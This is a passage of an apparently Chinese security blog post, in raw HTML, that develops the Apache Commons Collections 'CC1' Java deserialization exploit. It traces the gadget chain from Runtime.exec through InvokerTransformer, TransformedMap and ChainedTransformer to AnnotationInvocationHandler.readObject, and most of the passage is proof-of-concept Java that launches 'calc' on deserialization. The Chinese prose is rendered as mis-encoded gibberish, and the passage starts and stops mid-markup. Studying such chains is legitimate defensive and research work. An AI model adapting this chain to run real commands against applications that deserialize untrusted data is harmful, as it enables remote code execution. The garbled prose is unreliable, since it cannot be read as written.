class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//Ëé∑ÂèñRuntimeÂÆû‰æã  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> runtime.getClass();  <span class="comment">//Ëé∑ÂèñClassÂÆû‰æãÂØπË±°  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">cMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  <span class="comment">//Âà©Áî®ÂèçÂ∞ÑËé∑ÂèñRuntimeÁöÑexecÊñπÊ≥ï  </span></span><br><span class="line">  </span><br><span class="line">        cMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  <span class="comment">//Âú®runtimeÂÆû‰æã‰∏äË∞ÉÁî®execÊñπÊ≥ïÂπ∂‰º†ÂÖ•calcÂèÇÊï∞  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂèçÂ∞ÑË∞ÉÁî®execÊñπÊ≥ï‰∏∫ÔºåÂÖàÂæóÂà∞RuntimeÁ±ªÁöÑÂØπË±°runtimeÔºåÂÜçÂæóÂà∞Á±ª‰∏≠ÊâÄÊúâÊñπÊ≥ïÁöÑÂØπË±°cÔºå<br>ÁÑ∂ÂêéÂæóÂà∞execÊñπÊ≥ïÂπ∂ËµãÂÄºÁªôcMethodÔºåÁÑ∂Âêé‰ΩøÁî®MethodÁ±ªÁöÑinvokeÊñπÊ≥ïÊâßË°åRuntimeÁ±ª‰∏≠ÁöÑexecÊñπÊ≥ïÂπ∂‰º†ÂÖ•ÂèÇÊï∞calcÔºå‰πüÊúâ‰∏ÄÁßçÈìæÂ≠êÁöÑÊÑüËßâ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145805.png" alt="image-20230426214518703"><br>ÁÑ∂ÂêéÊîπÂÜô‰∏∫InvokerTransformerÁ±ª‰∏≠ÁöÑtransformÊñπÊ≥ïÊù•ÂºπÔºåÁî±‰∫étransformÊñπÊ≥ï‰∏∫publicÊâÄ‰ª•Êó†ÈúÄÂèçÂ∞Ñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//Ëé∑ÂèñRuntimeÂÆû‰æã  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        invokerTransformer.transform(runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Á¨¨‰∫åÂè•‰∏∫‰ªÄ‰πàË¶ÅÈÇ£Ê†∑ÊûÑÈÄ†Ë∑üËøõÁ±ªÂíåÊñπÊ≥ïÁúã‰∏Ä‰∏ãÂ∞±ËÉΩÁêÜËß£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145403.png" alt="image-20230426214543314"><br>ÁÑ∂ÂêéÊ†πÊçÆÊúÄÂêé‰∏ÄÂè•<code>invokerTransformer.transform(runtime);</code>ÂéªÂØªÊâæ‰∏çÂêåÂêçÂáΩÊï∞ÔºåËøôÈáåÊàëÂá∫‰∫Ü‰∏Ä‰∏™ÈóÆÈ¢òÂ∞±ÊòØÊàëÂÖ®Â±ÄÊêúÁ¥¢‰∏çÂà∞transformÊñπÊ≥ïÁöÑÂºïÁî®ÔºåÂéüÂõ†ÊòØÂú®maven‰∏≠Ê≤°Êúâ‰∏ãËΩΩjarÂåÖÁöÑÊ∫êÁ†ÅÔºåÊâÄ‰ª•Âú®ËøôÈáåÊêú‰∏çÂà∞ÔºåÂèÇËÄÉ<a href="https://blog.csdn.net/qq_26012495/article/details/109694133">Ëß£ÂÜ≥</a>ÔºåÁÑ∂Âêéfind usagesÂ∞±ËÉΩÊâæÂà∞Ëøô‰∏™ÊñπÊ≥ïÁöÑÂºïÁî®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145831.png" alt="image-20230426214555687"><br>ÊúÄÁªàÊâæÂà∞TransformedMapÁ±ªÁöÑcheckSetValueÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262146939.png" alt="image-20230426214602802"><br>Ë∑üËøõ‰∏Ä‰∏ãvalueTransformerÊñπÊ≥ïÔºåÁúãÂà∞ÂÆÉÁöÑÊûÑÈÄ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span>  </span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span>  </span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer     valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>(map);  </span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;  </span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊòØ‰∏Ä‰∏™‰øùÊä§Á±ªÂûãÂèòÈáèÈÄöËøáÊûÑÈÄ†ÂáΩÊï∞ËµãÂÄºÔºåÁªßÁª≠ÂæÄ‰∏ãÁúãÊâæÂà∞‰∏Ä‰∏™publicÊñπÊ≥ïËøîÂõû‰∫ÜÊûÑÈÄ†ÂáΩÊï∞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorateTransform</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="type">TransformedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);  </span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformed</span> <span class="operator">=</span> decorated.transformMap(map);  </span><br><span class="line">        decorated.clear();  </span><br><span class="line">        decorated.getMap().putAll(transformed);  <span class="comment">// avoids double transformation  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> decorated;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂÜçÂõûÂøÜ‰∏Ä‰∏ãÊàë‰ª¨‰∏ÄÂºÄÂßãÁöÑÂ∞æÈÉ®<code>invokerTransformer.transform(runtime);</code>ÊâÄ‰ª•ËøôÈáåËÆ©valueTransformer‰∏∫invokerTransformerÊòØ‰∏çÊòØÂ∞±ÂèØ‰ª•ÂºπËÆ°ÁÆóÂô®‰∫ÜÔºå‰ΩÜÊòØÁî±‰∫évalueTransformerÊòØprotectedÂûãÊâÄ‰ª•Êàë‰ª¨Â∞±Ë¶ÅÂà©Áî®ÂèçÂ∞ÑÊù•Ëé∑ÂæóÔºåÂºÄÂßãÊûÑÈÄ†poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//Ëé∑ÂèñRuntimeÂÆû‰æã  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//ËøôÈáåÂàõÂª∫‰∏Ä‰∏™hashmapÂØπË±°ÊòØÂõ†‰∏∫decorateTransformÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫mapÂØπË±°  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">        <span class="comment">//ÂæóÂà∞‰∏Ä‰∏™Êñ∞ÁöÑTransformedMapÂØπË±°  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span><br><span class="line">        <span class="comment">//Ëé∑ÂæóTransformedMapÁ±ªÁöÑÂØπË±°  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line">  </span><br><span class="line">        checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        checkSetValueMethod.invoke(decorateMap,runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âà©Áî®ÊàêÂäü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147170.png" alt="image-20230426214628370"><br>ÁÑ∂ÂêéËøôÈáå<code>.decorate</code>Êó†Ê≥ïÂÜçÁªßÁª≠ÂæÄÂâç‰∫ÜÔºåÊâÄ‰ª•ÂæóÈáçÊñ∞Êâæ‰∏ÄÊù°ÔºåËøòÊòØfind usagesÔºå‰∏çËøáËøôÊ¨°ÊòØÊâæcheckSetValueÁöÑÁ¥¢ÂºïÔºåÁÑ∂ÂêéÊâæÂà∞‰∫ÜAbstractInputCheckedMapDecoratorÁ±ªÂç≥TransformedMapÁöÑÁà∂Á±ª<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147042.png" alt="image-20230426214744010"><br>ÈáåÈù¢ÁöÑsetValueÊñπÊ≥ïË∞ÉÁî®‰∫ÜcheckSetValueÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">    value = parent.checkSetValue(value);  </span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËÄåË∞ÉÁî®‰∫ÜsetValueÁöÑÁ±ªÊòØAbstractInputCheckedMapDecoratorÁöÑÂÜÖÈÉ®Á±ªMapEntry<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148400.png" alt="image-20230426214800338"><br>setValueÊñπÊ≥ïÂ∞±ÊòØÂØπÈîÆÂÄºÂØπ‰∏≠ÁöÑÂÄºËµãÂÄºÁöÑÊìç‰ΩúÔºåË∑üËøõÂéªÂç≥ÂèØÁúãÂà∞<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148781.png" alt="image-20230426214809746"><br>ÁÑ∂ÂêéÁªßÁª≠ÂØπsetValueÊü•ÊâæÁ¥¢Âºïfind usagesÔºåÂ¶ÇÊûúÊòØreadObjectÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ïÈÇ£‰πàÂ∞±ÊâæÂà∞‰∫ÜÂÖ•Âè£<br>Âú®ËøôÈáåÊâæÂà∞ÂÖ•Âè£Á±ªAnnotationInvocationHandlerÈáåÈù¢ÁöÑreadObjectÊñπÊ≥ïË∞ÉÁî®‰∫ÜsetValueÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148807.png" alt="image-20230426214825669"><br>‰ΩÜÊòØË¶ÅË∞ÉÁî®setValueÊñπÊ≥ïÈ¶ñÂÖàÂæóÊª°Ë∂≥‰∏§‰∏™Êù°‰ª∂Ôºå‰πüÂ∞±ÊòØËøô‰∏§‰∏™ifÔºåmemberType‰∏çËÉΩ‰∏∫Á©∫ÔºåÁ¨¨‰∫å‰∏™ifÈ¶ñÂÖàÂà§Êñ≠ÂèòÈáè‚Äùvalue‚ÄùÊòØÂê¶ÊòØÊåáÂÆöÁöÑÁ±ªÂûã‚ÄùmemberType‚ÄùÁöÑÂÆû‰æãÔºåËøôÈáå‰ΩøÁî®‰∫ÜJava‰∏≠ÁöÑisInstanceÊñπÊ≥ï„ÄÇÂ¶ÇÊûú‚Äùvalue‚ÄùÊòØÊåáÂÆöÁ±ªÂûãÁöÑÂÆû‰æãÔºåÂàôÊù°‰ª∂Ë°®ËææÂºèÁöÑÂÄº‰∏∫trueÔºåÊï¥‰∏™Êù°‰ª∂ËØ≠Âè•ÁöÑÊâßË°åÁªìÊûú‰∏∫false„ÄÇÂ¶ÇÊûú‚Äùvalue‚Äù‰∏çÊòØÊåáÂÆöÁ±ªÂûãÁöÑÂÆû‰æãÔºåÊé•‰∏ãÊù•ÂÜçÂà§Êñ≠‚Äùvalue‚ÄùÊòØÂê¶ÊòØExceptionProxyÁ±ªÁöÑÂÆû‰æã„ÄÇÂ¶ÇÊûú‚Äùvalue‚ÄùÊòØExceptionProxyÁ±ªÁöÑÂÆû‰æãÔºåÂàôÊù°‰ª∂Ë°®ËææÂºèÁöÑÂÄº‰∏∫trueÔºåÊï¥‰∏™Êù°‰ª∂ËØ≠Âè•ÁöÑÊâßË°åÁªìÊûú‰∏∫false„ÄÇ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148500.png" alt="image-20230426214837403"><br>Êé•‰∏ãÊù•ÊûÑÈÄ†exp</p><h2 id="TransformedMap-ÁâàCC1-EXP"><a href="#TransformedMap-ÁâàCC1-EXP" class="headerlink" title="TransformedMap ÁâàCC1 EXP"></a>TransformedMap ÁâàCC1 EXP</h2><p>‰∏ãÈù¢ÊòØÁêÜÊÉ≥ÊÉÖÂÜµ‰∏ãÁöÑpayload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//Ëé∑ÂèñRuntimeÂÆû‰æã  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//ËøôÈáåÂàõÂª∫‰∏Ä‰∏™hashmapÂØπË±°ÊòØÂõ†‰∏∫decorateTransformÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫mapÂØπË±°  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØËøô‰∏™payloadËøòÊúâ‰∏â‰∏™ÈóÆÈ¢òÊ≤°Ëß£ÂÜ≥ÊâÄ‰ª•Ê≥®ÂÆö‰ºöÂ§±Ë¥•</p><blockquote><ol><li>RuntimeÂØπË±°‰∏çËÉΩË¢´Â∫èÂàóÂåñ</li><li>setValue‰º†ÂÖ•ÁöÑÂØπË±°Â∫îËØ•ÊòØRuntimeÂØπË±°ÁöÑÔºåËÄåÂú®ÂÆûÈôÖÊÉÖÂÜµ‰∏≠Á°ÆÊòØAnnotationTypeMismatchExceptionProxy<br>3.ÈÄöËøá‰∏§‰∏™ifÂà§Êñ≠</li></ol></blockquote><h3 id="Ëß£ÂÜ≥Runtime‰∏çËÉΩÂ∫èÂàóÂåñ"><a href="#Ëß£ÂÜ≥Runtime‰∏çËÉΩÂ∫èÂàóÂåñ" class="headerlink" title="Ëß£ÂÜ≥Runtime‰∏çËÉΩÂ∫èÂàóÂåñ"></a>Ëß£ÂÜ≥Runtime‰∏çËÉΩÂ∫èÂàóÂåñ</h3><p>Runtime‰∏çËÉΩÂ∫èÂàóÂåñÂõ†‰∏∫Ëøô‰∏™Á±ªÊ≤°ÊúâSerializableÊé•Âè£Ôºå‰ΩÜÊòØRuntime.classÂèØ‰ª•ÔºåÂÖàÂÜô‰∏Ä‰∏™ÊôÆÈÄöÁöÑÂèçÂ∞Ñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line">        <span class="comment">//Â∞ÜruntimeÂº∫Âà∂ËΩ¨Êç¢‰∏∫RuntimeÂØπË±°  </span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line">        <span class="comment">//Ëé∑ÂèñexecÊñπÊ≥ï  </span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  </span><br><span class="line">        method.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂ∞Ü<code>Runtime</code>Êîπ‰∏∫<code>InvokerTransformer</code> Ë∞ÉÁî®ÁöÑÊñπÂºèÔºåËøôÈáå‰∏∫‰∫ÜÈÅøÂÖçÂÜó‰ΩôÔºåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®ChainedTransformerÁ±ªÂéªÂ•óÔºåChainedTransformerÁ±ªÂÆûÁé∞‰∫ÜTransformerÈìæÂºèË∞ÉÁî®ÔºåÊàë‰ª¨Âè™ÈúÄË¶Å‰º†ÂÖ•‰∏Ä‰∏™TransformerÊï∞ÁªÑChainedTransformerÂ∞±ÂèØ‰ª•ÂÆûÁé∞‰æùÊ¨°ÁöÑÂéªË∞ÉÁî®ÊØè‰∏Ä‰∏™TransformerÁöÑtransformÊñπÊ≥ï„ÄÇ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂÜçÊääÂÆÉ‰∏é <code>decorate</code> ÁöÑÈìæÂ≠êÁªìÂêà</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> 